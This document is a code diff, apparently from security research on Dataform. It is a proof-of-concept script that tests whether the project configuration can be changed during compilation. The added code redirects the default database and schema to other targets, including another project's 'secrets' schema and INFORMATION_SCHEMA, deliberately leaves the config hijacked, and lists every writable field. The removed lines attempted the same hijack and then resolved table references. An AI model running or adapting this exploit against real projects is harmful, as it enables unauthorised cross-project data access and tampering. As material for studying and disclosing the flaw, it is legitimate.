@@ -6,37 +6,63 @@ js {
   // Record original config
   r.original = {
     defaultDatabase: dataform.projectConfig.defaultDatabase,
+    defaultSchema: dataform.projectConfig.defaultSchema,
+    frozen: Object.isFrozen(dataform.projectConfig),
+    sealed: Object.isSealed(dataform.projectConfig)
+  };
+
+  // VULNERABILITY: Config is not frozen - we can modify it
+  // This affects ALL subsequent actions in the compilation
+
+  // Try different hijack targets
+  const hijackAttempts = [
+    // Target 1: Public data (read-only, should work)
+    { db: "bigquery-public-data", schema: "austin_311" },
+    // Target 2: Another project in same org
+    { db: "shir-research-2", schema: "secrets" },
+    // Target 3: INFORMATION_SCHEMA access
+    { db: "shir-research-3", schema: "INFORMATION_SCHEMA" }
+  ];
+
+  r.hijackAttempts = [];
+
+  for (const target of hijackAttempts) {
+    try {
+      dataform.projectConfig.defaultDatabase = target.db;
+      dataform.projectConfig.defaultSchema = target.schema;
+
+      r.hijackAttempts.push({
+        target: target,
+        success: true,
+        newDb: dataform.projectConfig.defaultDatabase,
+        newSchema: dataform.projectConfig.defaultSchema
+      });
+    } catch(e) {
+      r.hijackAttempts.push({
+        target: target,
+        success: false,
+        error: e.message
+      });
+    }
+  }
+
+  // Final state - leave it pointing to INFORMATION_SCHEMA
+  r.finalConfig = {
+    defaultDatabase: dataform.projectConfig.defaultDatabase,
     defaultSchema: dataform.projectConfig.defaultSchema
   };
 
-  // EXPLOIT: Modify config to point to a different project/dataset
-  try {
-    // Try to hijack to public data
-    dataform.projectConfig.defaultDatabase = "bigquery-public-data";
-    dataform.projectConfig.defaultSchema = "samples";
-
-    r.modified = {
-      defaultDatabase: dataform.projectConfig.defaultDatabase,
-      defaultSchema: dataform.projectConfig.defaultSchema,
-      success: true
-    };
-  } catch(e) {
-    r.modified = { error: e.message };
-  }
-
-  // Now try to ref a table - will it use the new config?
-  try {
-    // This should now resolve to bigquery-public-data.samples.shakespeare
-    r.refAfterHijack = String(ref('shakespeare'));
-  } catch(e) {
-    r.refAfterHijack = 'E:' + e.message;
-  }
-
-  // Try resolve() after hijack
-  try {
-    r.resolveAfterHijack = String(resolve('shakespeare'));
-  } catch(e) {
-    r.resolveAfterHijack = 'E:' + e.message;
+  // What else can we modify?
+  r.modifiableFields = [];
+  for (const key of Object.keys(dataform.projectConfig)) {
+    const orig = dataform.projectConfig[key];
+    try {
+      dataform.projectConfig[key] = "MODIFIED";
+      if (dataform.projectConfig[key] === "MODIFIED") {
+        r.modifiableFields.push(key);
+      }
+      dataform.projectConfig[key] = orig;
+    } catch(e) {}
   }
 }
 
